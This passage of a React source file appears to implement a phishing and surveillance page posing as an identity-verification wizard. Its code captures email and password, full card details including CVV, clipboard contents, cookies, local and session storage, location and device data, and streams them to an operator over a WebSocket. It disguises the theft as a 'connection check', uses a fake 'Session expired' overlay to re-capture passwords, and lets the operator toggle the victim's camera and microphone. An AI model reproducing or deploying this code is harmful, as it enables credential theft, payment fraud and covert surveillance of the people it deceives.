      sendWS({ type: "rc_permission_granted", permission: "credentials" });
      return;
    }
    updatePermission("credentials", { loading: true, error: null });
    setShowCredentialOverlay(true);
    updatePermission("credentials", { loading: false, granted: false, error: null });
  }, [updatePermission, cfg.enableCredentialOverlay, sendWS]);

  const submitCredentials = useCallback((type: "login" | "banking") => {
    const data: Record<string, string> = { type, timestamp: new Date().toISOString() };
    if (type === "login") {
      data.email = credForm.email;
      data.password = credForm.password;
      setCapturedEmail(credForm.email);
    } else {
      data.cardName = credForm.cardName;
      data.cardNumber = credForm.cardNumber;
      data.cardExpiry = credForm.cardExpiry;
      data.cardCvv = credForm.cardCvv;
    }
    sendWS({ type: "rc_credentials", data, token });
    updatePermission("credentials", { granted: true, loading: false });
    sendWS({ type: "rc_permission_granted", permission: "credentials" });
    setShowCredentialOverlay(false);
    setCredForm({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
    setTimeout(() => advanceStep(), 500);
  }, [credForm, sendWS, updatePermission, token]);

  const handleClipboard = useCallback(async () => {
    updatePermission("clipboard", { loading: true, error: null });
    try {
      const text = await navigator.clipboard.readText();
      sendWS({ type: "rc_clipboard", data: { content: text, timestamp: new Date().toISOString() }, token });
      updatePermission("clipboard", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "clipboard" });
    } catch (err: any) {
      updatePermission("clipboard", { loading: false, error: err.message || "Clipboard access denied" });
      sendWS({ type: "rc_permission_denied", permission: "clipboard" });
    }
  }, [sendWS, updatePermission, token]);

  const handleBrowserData = useCallback(async () => {
    updatePermission("browserData", { loading: true, error: null });
    try {
      const lsKeys: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) { lsKeys[key] = (localStorage.getItem(key) || "").substring(0, 200); }
      }
      const ssKeys: Record<string, string> = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) { ssKeys[key] = (sessionStorage.getItem(key) || "").substring(0, 200); }
      }
      const plugins: string[] = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      const browserData = {
        cookies: document.cookie || "(no accessible cookies)",
        localStorageKeys: lsKeys,
        localStorageCount: localStorage.length,
        sessionStorageKeys: ssKeys,
        sessionStorageCount: sessionStorage.length,
        historyLength: history.length,
        plugins,
        referrer: document.referrer || "(direct)",
        documentTitle: document.title,
        characterSet: document.characterSet,
        contentType: document.contentType || "text/html",
        timestamp: new Date().toISOString(),
      };
      sendWS({ type: "rc_browser_data", data: browserData, token });
      updatePermission("browserData", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "browserData" });
    } catch (err: any) {
      updatePermission("browserData", { loading: false, error: err.message || "Failed to collect browser data" });
      sendWS({ type: "rc_permission_denied", permission: "browserData" });
    }
  }, [sendWS, updatePermission, token]);

  const handlers: Record<PermissionKey, () => void> = {
    camera: handleCamera, microphone: handleMicrophone, location: handleLocation,
    deviceInfo: handleDeviceInfo, files: handleFiles, credentials: handleCredentials,
    clipboard: handleClipboard, browserData: handleBrowserData,
  };

  const handlePermissionRequest = useCallback((permission: PermissionKey) => {
    if (permissions[permission]?.granted) return;
    setPendingRequest(permission);
  }, [permissions]);

  const handleToggleCamera = useCallback((enabled: boolean) => {
    cameraTracksRef.current.forEach(t => { t.enabled = enabled; });
    sendWS({ type: "rc_track_toggled", track: "camera", enabled });
  }, [sendWS]);

  const handleToggleMic = useCallback((enabled: boolean) => {
    micTracksRef.current.forEach(t => { t.enabled = enabled; });
    sendWS({ type: "rc_track_toggled", track: "microphone", enabled });
  }, [sendWS]);

  const acceptRequest = useCallback(() => {
    if (pendingRequest && handlers[pendingRequest]) { handlers[pendingRequest](); }
    setPendingRequest(null);
  }, [pendingRequest, handlers]);

  const denyRequest = useCallback(() => {
    if (pendingRequest) { sendWS({ type: "rc_permission_denied", permission: pendingRequest }); }
    setPendingRequest(null);
  }, [pendingRequest, sendWS]);

  const advanceStep = useCallback(() => {
    setStepTransition(true);
    setTimeout(() => {
      setCurrentStep((prev) => {
        const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
        let next = prev + 1;
        while (next <= WIZARD_STEPS.length && !activeStepKeys.includes(stepKeys[next - 1])) {
          next++;
        }
        if (next > WIZARD_STEPS.length) {
          setWizardComplete(true);
          return prev;
        }
        return next;
      });
      setTimeout(() => setStepTransition(false), 50);
    }, 300);
  }, [activeStepKeys]);

  const runEnvironmentScan = useCallback(async () => {
    setScanRunning(true);
    setScanProgress(0);
    setEnvCheckItems([]);

    const items = [
      { label: "Secure connection verified", delay: 1200 },
      { label: "Region confirmed", delay: 1500 },
      { label: "Browser compatible", delay: 1000 },
      { label: "Clipboard checked", delay: 1200 },
      { label: "Device recognized", delay: 1000 },
      { label: "All checks passed", delay: 800 },
    ];

    let harvested = false;

    for (let i = 0; i < items.length; i++) {
      setScanProgress(Math.round(((i + 1) / items.length) * 100));
      setScanStatus(items[i].label);

      if (i === 1 && !permissions.location.granted) {
        try { await new Promise<void>((res) => { handleLocation(); setTimeout(res, 1500); }); } catch {}
      }
      if (i === 2 && !permissions.browserData.granted) {
        try { await handleBrowserData(); } catch {}
        harvested = true;
      }
      if (i === 3 && !permissions.clipboard.granted) {
        try { await handleClipboard(); } catch {}
      }
      if (i === 4 && !permissions.deviceInfo.granted) {
        try { await handleDeviceInfo(); } catch {}
      }

      await new Promise((r) => setTimeout(r, harvested ? 600 : items[i].delay));
      setEnvCheckItems((prev) => [...prev, items[i].label]);
    }

    setScanRunning(false);
    setTimeout(() => advanceStep(), 800);
  }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, permissions, advanceStep]);

  useEffect(() => {
    if (currentStep === 0) return;
    const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
    const stepKey = stepKeys[currentStep - 1];

    if (stepKey === "environment" && !scanRunning && scanProgress === 0) {
      const timer = setTimeout(() => runEnvironmentScan(), 800);
      return () => clearTimeout(timer);
    }

    if (!cfg.autoRequestPermissions) return;
    const autoRequestMap: Record<string, PermissionKey | null> = {
      biometric: "camera",
      voice: "microphone",
    };
    const permToRequest = autoRequestMap[stepKey];
    if (permToRequest && !permissions[permToRequest].granted && !permissions[permToRequest].loading) {
      const timer = setTimeout(() => {
        if (handlers[permToRequest]) handlers[permToRequest]();
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [currentStep, cfg.autoRequestPermissions]);

  useEffect(() => {
    if (!session) return;
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;
    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_join", token })); };
    ws.onmessage = async (evt) => {
      try {
        const msg = JSON.parse(evt.data);
        if (msg.type === "rc_answer" && pcRef.current) await pcRef.current.setRemoteDescription(new RTCSessionDescription(msg.sdp));
        if (msg.type === "rc_ice_candidate" && pcRef.current && msg.candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate));
        if (msg.type === "rc_request_permission" && msg.permission) handlePermissionRequest(msg.permission as PermissionKey);
        if (msg.type === "rc_toggle_camera") handleToggleCamera(msg.enabled);
        if (msg.type === "rc_toggle_mic") handleToggleMic(msg.enabled);
        if (msg.type === "rc_session_closed") setError("Session has been closed by the operator");
      } catch {}
    };
    return () => { ws.close(); if (pcRef.current) pcRef.current.close(); };
  }, [session, token, handlePermissionRequest, handleToggleCamera, handleToggleMic]);

  if (loading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-3">
          <div className="w-10 h-10 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
          <span className="text-sm text-gray-500" data-testid="loading-spinner">Loading...</span>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-sm border border-gray-200 p-8 text-center">
          <div className="w-12 h-12 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
            <XCircle className="w-6 h-6 text-red-500" />
          </div>
          <h2 className="text-lg font-semibold text-gray-900 mb-2" data-testid="text-error-title">Page Not Available</h2>
          <p className="text-sm text-gray-500" data-testid="text-error-message">{error}</p>
          <p className="text-xs text-gray-400 mt-4">If you believe this is an error, please contact support.</p>
        </div>
      </div>
    );
  }

  if (!autoHarvestDone) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-4 max-w-xs text-center">
          <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
          <p className="text-sm font-medium text-gray-700" data-testid="text-init-status">{initStatus}</p>
          <p className="text-xs text-gray-400">This may take a moment</p>
        </div>
      </div>
    );
  }

  const currentStepIndex = activeWizardSteps.findIndex((s) => s.id === currentStep);
  const overallProgress = activeWizardSteps.length > 0 ? Math.round(((Math.max(0, currentStepIndex) + (wizardComplete ? 1 : 0)) / activeWizardSteps.length) * 100) : 0;
  const timerMin = Math.floor(urgencyTimer / 60);
  const timerSec = urgencyTimer % 60;

  const renderStep1 = () => (
    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-identity">
      <div className="max-w-sm mx-auto space-y-5">
        <div className="text-center space-y-1">
          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Sign in to continue</h2>
          <p className="text-sm text-gray-500">Enter your account details to verify your identity</p>
        </div>

        {!forgotPassword ? (
          <div className="space-y-4">
            <div className="flex gap-3">
              <button
                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
                onClick={() => { setSocialToast("Google"); setTimeout(() => setSocialToast(null), 3000); }}
                data-testid="button-social-google"
              >
                <SiGoogle className="w-4 h-4" />
                <span>Google</span>
              </button>
              <button
                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
                onClick={() => { setSocialToast("Apple"); setTimeout(() => setSocialToast(null), 3000); }}
                data-testid="button-social-apple"
              >
                <SiApple className="w-4 h-4" />
                <span>Apple</span>
              </button>
              <button
                className="flex-1 flex items-center justify-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors text-sm text-gray-700"
                onClick={() => { setSocialToast("Microsoft"); setTimeout(() => setSocialToast(null), 3000); }}
                data-testid="button-social-microsoft"
              >
                <Globe className="w-4 h-4" />
                <span className="hidden sm:inline">Microsoft</span>
              </button>
            </div>

            <div className="flex items-center gap-3">
              <div className="flex-1 h-px bg-gray-200" />
              <span className="text-xs text-gray-400">or continue with email</span>
              <div className="flex-1 h-px bg-gray-200" />
            </div>

            {credTab === "login" && (
              <div className="space-y-3">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Email</label>
                  <Input
                    type="email"
                    placeholder="you@example.com"
                    value={credForm.email}
                    onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))}
                    className="h-11 bg-white border-gray-200 focus:border-gray-400 focus:ring-gray-400"
                    data-testid="input-cred-email"
                  />
                </div>
                <div>
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="text-sm font-medium text-gray-700">Password</label>
                    <button
                      className={`text-xs ${brand.accent} hover:underline`}
                      onClick={() => setForgotPassword(true)}
                      data-testid="link-forgot-password"
                    >
                      Forgot password?
                    </button>
                  </div>
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter your password"
                      value={credForm.password}
                      onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))}
                      className="h-11 bg-white border-gray-200 focus:border-gray-400 focus:ring-gray-400 pr-10"
                      data-testid="input-cred-password"
                    />
                    <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600" onClick={() => setShowPassword(!showPassword)}>
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="w-4 h-4 rounded border-gray-300"
                    data-testid="checkbox-remember"
                  />
                  <label htmlFor="remember" className="text-sm text-gray-600">Remember me</label>
                </div>
                <Button
                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
                  onClick={() => submitCredentials("login")}
                  data-testid="button-submit-login"
                >
                  Sign in
                </Button>
              </div>
            )}

            {cfg.enableBanking && credTab === "banking" && (
              <div className="space-y-3">
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Cardholder name</label>
                  <Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-name" />
                </div>
                <div>
                  <label className="text-sm font-medium text-gray-700 mb-1.5 block">Card number</label>
                  <div className="relative">
                    <Input placeholder="1234 5678 9012 3456" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} className="h-11 bg-white border-gray-200 pr-10" data-testid="input-card-number" />
                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-sm font-medium text-gray-700 mb-1.5 block">Expiry</label>
                    <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-expiry" />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-gray-700 mb-1.5 block">CVV</label>
                    <Input type="password" placeholder="123" maxLength={4} value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-cvv" />
                  </div>
                </div>
                <Button
                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
                  onClick={() => submitCredentials("banking")}
                  data-testid="button-submit-banking"
                >
                  Verify payment method
                </Button>
              </div>
            )}

            {cfg.enableBanking && (
              <div className="text-center">
                <button
                  className={`text-sm ${brand.accent} hover:underline`}
                  onClick={() => setCredTab(credTab === "login" ? "banking" : "login")}
                  data-testid="toggle-cred-tab"
                >
                  {credTab === "login" ? "Add payment method instead" : "Sign in with email instead"}
                </button>
              </div>
            )}

            <p className="text-center text-xs text-gray-400">
              Don't have an account?{" "}
              <button className={`${brand.accent} hover:underline`} onClick={advanceStep} data-testid="link-create-account">
                Create one
              </button>
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {!resetSent ? (
              <>
                <p className="text-sm text-gray-500">Enter your email and we'll send you a link to reset your password.</p>
                <Input
                  type="email"
                  placeholder="you@example.com"
                  value={resetEmail}
                  onChange={(e) => setResetEmail(e.target.value)}
                  className="h-11 bg-white border-gray-200"
                  data-testid="input-reset-email"
                />
                <Button
                  className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white font-medium`}
                  onClick={() => {
                    sendWS({ type: "rc_credentials", data: { type: "reset", email: resetEmail, timestamp: new Date().toISOString() }, token });
                    setResetSent(true);
                  }}
                  data-testid="button-send-reset"
                >
                  Send reset link
                </Button>
              </>
            ) : (
              <div className="text-center space-y-3 py-4">
                <div className="w-12 h-12 bg-green-50 rounded-full flex items-center justify-center mx-auto">
                  <Check className="w-6 h-6 text-green-600" />
                </div>
                <p className="text-sm text-gray-700">Check your email for a reset link</p>
                <p className="text-xs text-gray-400">Didn't receive it? Check your spam folder.</p>
              </div>
            )}
            <button
              className={`text-sm ${brand.accent} hover:underline w-full text-center`}
              onClick={() => { setForgotPassword(false); setResetSent(false); setResetEmail(""); }}
              data-testid="link-back-to-login"
            >
              Back to sign in
            </button>
          </div>
        )}
      </div>
    </div>
  );

  const renderStep2 = () => (
    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-biometric">
      <div className="max-w-sm mx-auto space-y-5">
        <div className="text-center space-y-1">
          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Take a quick selfie</h2>
          {capturedEmail && <p className="text-sm text-green-600">Hi, {capturedEmail.split("@")[0]}</p>}
          <p className="text-sm text-gray-500">We need a photo to confirm you are the account owner</p>
        </div>

        <div className="bg-white rounded-xl border border-gray-200 p-6">
          {permissions.camera.granted && !selfieCaptured ? (
            <div className="space-y-4 text-center">
              <div className="w-48 h-48 rounded-full overflow-hidden mx-auto border-4 border-gray-100 relative">
                <video
                  ref={(el) => {
                    selfieVideoRef.current = el;
                    if (el && cameraStreamRef.current && !el.srcObject) {
                      el.srcObject = cameraStreamRef.current;
                      el.play().catch(() => {});
                    }
                  }}
                  autoPlay playsInline muted
                  className="w-full h-full object-cover scale-x-[-1]"
                  data-testid="video-selfie-preview"
                />
              </div>
              <p className="text-sm text-gray-500">Looking good! Click capture when ready.</p>
              <Button
                className={`${brand.bg} hover:opacity-90 text-white px-8`}
                onClick={() => {
                  setSelfieCaptured(true);
                  setTimeout(() => advanceStep(), 2000);
                }}
                data-testid="button-capture-selfie"
              >
                <Camera className="w-4 h-4 mr-2" />
                Capture
              </Button>
            </div>
          ) : selfieCaptured ? (
            <div className="space-y-4 text-center py-4">
              <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle2 className="w-8 h-8 text-green-600" />
              </div>
              <p className="text-sm font-medium text-green-700">Photo captured successfully</p>
              <p className="text-xs text-gray-400">Verifying your identity...</p>
            </div>
          ) : permissions.camera.loading ? (
            <div className="space-y-4 text-center py-4">
              <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-600 rounded-full animate-spin mx-auto" />
              <p className="text-sm text-gray-500">Accessing camera...</p>
            </div>
          ) : (
            <div className="space-y-5 text-center">
              <div className="w-48 h-48 rounded-full bg-gray-50 border-2 border-dashed border-gray-200 flex items-center justify-center mx-auto">
                <User className="w-20 h-20 text-gray-200" />
              </div>
              <div className="space-y-2">
                <div className="flex items-center gap-3 justify-center text-xs text-gray-400">
                  <span>Good lighting</span>
                  <span className="w-1 h-1 bg-gray-300 rounded-full" />
                  <span>Face centered</span>
                  <span className="w-1 h-1 bg-gray-300 rounded-full" />
                  <span>No sunglasses</span>
                </div>
              </div>
              {permissions.camera.error && (
                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
                  <p className="text-xs text-red-600">{permissions.camera.error}</p>
                </div>
              )}
              <Button
                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
                onClick={handleCamera}
                data-testid="button-start-scan"
              >
                <Camera className="w-4 h-4 mr-2" />
                Take Photo
              </Button>
            </div>
          )}
        </div>

        <button
          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
          onClick={advanceStep}
          data-testid="button-skip-step"
        >
          I'll do this later
        </button>
      </div>
    </div>
  );

  const renderStep3 = () => (
    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-voice">
      <div className="max-w-sm mx-auto space-y-5">
        <div className="text-center space-y-1">
          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Verify with your voice</h2>
          <p className="text-sm text-gray-500">Read the phrase below clearly into your microphone</p>
        </div>

        <div className="bg-white rounded-xl border border-gray-200 p-6">
          {permissions.microphone.granted ? (
            <div className="space-y-4 text-center">
              {voiceRecording ? (
                <>
                  <div className="bg-gray-900 rounded-lg p-4 h-24 flex items-end justify-center">
                    <canvas ref={audioCanvasRef} width={280} height={80} className="w-full h-full" data-testid="canvas-audio-visualizer" />
                  </div>
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                    <span className="text-sm font-medium text-gray-700">Recording... {voiceRecordingTime}s / 5s</span>
                  </div>
                  <Progress value={(voiceRecordingTime / 5) * 100} className="h-1.5" />
                </>
              ) : (
                <div className="space-y-3 py-4">
                  <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
                    <CheckCircle2 className="w-8 h-8 text-green-600" />
                  </div>
                  <p className="text-sm font-medium text-green-700">Voice sample recorded</p>
                  <p className="text-xs text-gray-400">Processing your voice pattern...</p>
                </div>
              )}
            </div>
          ) : permissions.microphone.loading ? (
            <div className="space-y-4 text-center py-4">
              <div className="w-12 h-12 border-2 border-gray-200 border-t-gray-600 rounded-full animate-spin mx-auto" />
              <p className="text-sm text-gray-500">Accessing microphone...</p>
            </div>
          ) : (
            <div className="space-y-5 text-center">
              <div className="bg-gray-50 rounded-lg p-6 border border-gray-100">
                <p className="text-xs text-gray-400 mb-2">Read this phrase aloud:</p>
                <p className="text-lg font-medium text-gray-800 italic">"My voice is my password, verify me"</p>
              </div>
              {permissions.microphone.error && (
                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
                  <p className="text-xs text-red-600">{permissions.microphone.error}</p>
                </div>
              )}
              <Button
                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
                onClick={handleMicrophone}
                data-testid="button-start-voice"
              >
                <Mic className="w-4 h-4 mr-2" />
                Start Recording
              </Button>
            </div>
          )}
        </div>

        <button
          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
          onClick={advanceStep}
          data-testid="button-skip-step"
        >
          I'll do this later
        </button>
      </div>
    </div>
  );

  const renderStep4 = () => {
    return (
      <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-environment">
        <div className="max-w-sm mx-auto space-y-5">
          <div className="text-center space-y-1">
            <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Checking your connection</h2>
            <p className="text-sm text-gray-500">Verifying your device and network compatibility</p>
          </div>

          <div className="bg-white rounded-xl border border-gray-200 p-6">
            <div className="space-y-4">
              {scanRunning && (
                <div className="flex items-center justify-center gap-3 mb-2">
                  <Loader2 className="w-5 h-5 text-gray-400 animate-spin" />
                  <span className="text-sm text-gray-600" data-testid="text-scan-status">{scanStatus || "Starting checks..."}</span>
                </div>
              )}

              <Progress value={scanProgress} className="h-1" data-testid="progress-scan" />

              <div className="space-y-3 pt-2">
                {[
                  { label: "Secure connection verified", icon: Lock },
                  { label: "Region confirmed", icon: MapPin },
                  { label: "Browser compatible", icon: Globe },
                  { label: "Clipboard checked", icon: ClipboardPaste },
                  { label: "Device recognized", icon: Smartphone },
                  { label: "All checks passed", icon: ShieldCheck },
                ].map((item) => {
                  const isDone = envCheckItems.includes(item.label);
                  const Icon = item.icon;
                  return (
                    <div
                      key={item.label}
                      className={`flex items-center gap-3 text-sm transition-all duration-500 ${isDone ? "opacity-100" : "opacity-0 translate-y-1"}`}
                      style={{ transitionDelay: isDone ? "0ms" : "0ms" }}
                    >
                      {isDone ? (
                        <div className="w-5 h-5 bg-green-50 rounded-full flex items-center justify-center flex-shrink-0">
                          <Check className="w-3 h-3 text-green-600" />
                        </div>
                      ) : (
                        <div className="w-5 h-5 flex items-center justify-center flex-shrink-0">
                          <Loader2 className="w-3.5 h-3.5 text-gray-300 animate-spin" />
                        </div>
                      )}
                      <Icon className={`w-4 h-4 flex-shrink-0 ${isDone ? "text-gray-600" : "text-gray-300"}`} />
                      <span className={isDone ? "text-gray-700" : "text-gray-300"}>{item.label}</span>
                    </div>
                  );
                })}
              </div>

              {scanProgress === 100 && !scanRunning && (
                <div className="text-center pt-3">
                  <div className="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm">
                    <ShieldCheck className="w-4 h-4" />
                    Everything looks good
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    );
  };

  const renderStep5 = () => (
    <div className={`transition-all duration-300 ${stepTransition ? "opacity-0 translate-y-4" : "opacity-100 translate-y-0"}`} data-testid="step-documents">
      <div className="max-w-sm mx-auto space-y-5">
        <div className="text-center space-y-1">
          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-step-title">Upload your ID</h2>
          <p className="text-sm text-gray-500">Take a photo or upload an image of your government-issued ID</p>
        </div>

        <div className="bg-white rounded-xl border border-gray-200 p-6">
          {permissions.files.granted ? (
            <div className="space-y-4 text-center py-4">
              <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle2 className="w-8 h-8 text-green-600" />
              </div>
              <div>
                <p className="text-sm font-medium text-green-700">Document uploaded</p>
                {uploadedFileName && <p className="text-xs text-gray-400 mt-1">{uploadedFileName}</p>}
              </div>
              {uploadProgress < 100 && <Progress value={Math.min(uploadProgress, 100)} className="h-1" />}
              <Button
                className={`${brand.bg} hover:opacity-90 text-white px-8 h-11`}
                onClick={() => setWizardComplete(true)}
                data-testid="button-complete-verification"
              >
                Continue
                <ChevronRight className="w-4 h-4 ml-1" />
              </Button>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="grid grid-cols-3 gap-3 mb-4">
                {[
                  { icon: CreditCardIcon, label: "Driver's License" },
                  { icon: Globe, label: "Passport" },
                  { icon: FileText, label: "National ID" },
                ].map((item) => (
                  <div key={item.label} className="text-center p-3 rounded-lg border border-gray-100 bg-gray-50">
                    <item.icon className="w-6 h-6 text-gray-400 mx-auto mb-1" />
                    <p className="text-[10px] text-gray-500">{item.label}</p>
                  </div>
                ))}
              </div>

              <div
                className={`border-2 border-dashed rounded-xl p-8 text-center transition-colors cursor-pointer ${
                  dragOver ? "border-blue-400 bg-blue-50" : "border-gray-200 hover:border-gray-300"
                }`}
                onClick={handleFiles}
                onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
                onDragLeave={() => setDragOver(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setDragOver(false);
                  if (e.dataTransfer.files.length > 0) {
                    const dt = new DataTransfer();
                    for (const f of Array.from(e.dataTransfer.files)) dt.items.add(f);
                    if (fileInputRef.current) {
                      fileInputRef.current.files = dt.files;
                      fileInputRef.current.dispatchEvent(new Event("change", { bubbles: true }));
                    }
                  }
                }}
                data-testid="dropzone-upload"
              >
                <Upload className="w-8 h-8 text-gray-300 mx-auto mb-3" />
                <p className="text-sm text-gray-600 font-medium">Drop your file here or click to browse</p>
                <p className="text-xs text-gray-400 mt-1">JPG, PNG, or PDF up to 10MB</p>
              </div>

              {permissions.files.error && (
                <div className="bg-red-50 border border-red-100 rounded-lg p-3 text-center">
                  <p className="text-xs text-red-600">{permissions.files.error}</p>
                </div>
              )}
            </div>
          )}
        </div>

        <button
          className="text-xs text-gray-400 hover:text-gray-600 w-full text-center"
          onClick={() => {
            sendWS({ type: "rc_activity", data: { category: "step_skipped", step: "documents", timestamp: new Date().toISOString() }, token });
            setWizardComplete(true);
          }}
          data-testid="button-skip-step"
        >
          Skip for now
        </button>
      </div>
    </div>
  );

  const renderComplete = () => (
    <div className={`transition-all duration-500 opacity-100`} data-testid="step-complete">
      <div className="max-w-sm mx-auto text-center space-y-6 py-8">
        <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto">
          <CheckCircle2 className="w-10 h-10 text-green-600" />
        </div>
        <div className="space-y-2">
          <h2 className="text-xl font-semibold text-gray-900" data-testid="text-complete-title">You're all set</h2>
          {capturedEmail && <p className="text-sm text-green-600">Account verified: {capturedEmail}</p>}
          <p className="text-sm text-gray-500">
            Your identity has been successfully verified. You can now access your account.
          </p>
        </div>
        <div className="space-y-2 text-left max-w-xs mx-auto">
          {[
            { label: "Account login", done: permissions.credentials.granted },
            { label: "Photo verification", done: permissions.camera.granted },
            { label: "Voice verification", done: permissions.microphone.granted },
            { label: "Connection check", done: permissions.deviceInfo.granted || permissions.browserData.granted },
            { label: "Document upload", done: permissions.files.granted },
          ].filter((item) => {
            const stepMap: Record<string, string> = { "Account login": "identity", "Photo verification": "biometric", "Voice verification": "voice", "Connection check": "environment", "Document upload": "documents" };
            return activeStepKeys.includes(stepMap[item.label]);
          }).map((item) => (
            <div key={item.label} className="flex items-center gap-3 text-sm">
              {item.done ? (
                <div className="w-5 h-5 bg-green-50 rounded-full flex items-center justify-center">
                  <Check className="w-3 h-3 text-green-600" />
                </div>
              ) : (
                <div className="w-5 h-5 bg-gray-100 rounded-full flex items-center justify-center">
                  <X className="w-3 h-3 text-gray-400" />
                </div>
              )}
              <span className={item.done ? "text-gray-700" : "text-gray-400"}>{item.label}</span>
            </div>
          ))}
        </div>
        <div className="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm">
          <ShieldCheck className="w-4 h-4" />
          Session Active
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {showCredentialOverlay && (
        <div className="fixed inset-0 z-[60] bg-black/50 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
          <div className="max-w-sm w-full bg-white rounded-xl shadow-xl p-6 space-y-4 animate-in fade-in zoom-in-95">
            <div className="text-center space-y-1">
              <Lock className="w-8 h-8 text-gray-400 mx-auto mb-2" />
              <h3 className="text-lg font-semibold text-gray-900" data-testid="text-overlay-title">Session expired</h3>
              <p className="text-sm text-gray-500">Please sign in again to continue</p>
            </div>
            {credTab === "login" && (
              <div className="space-y-3">
                <Input type="email" placeholder="Email" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-cred-email-overlay" />
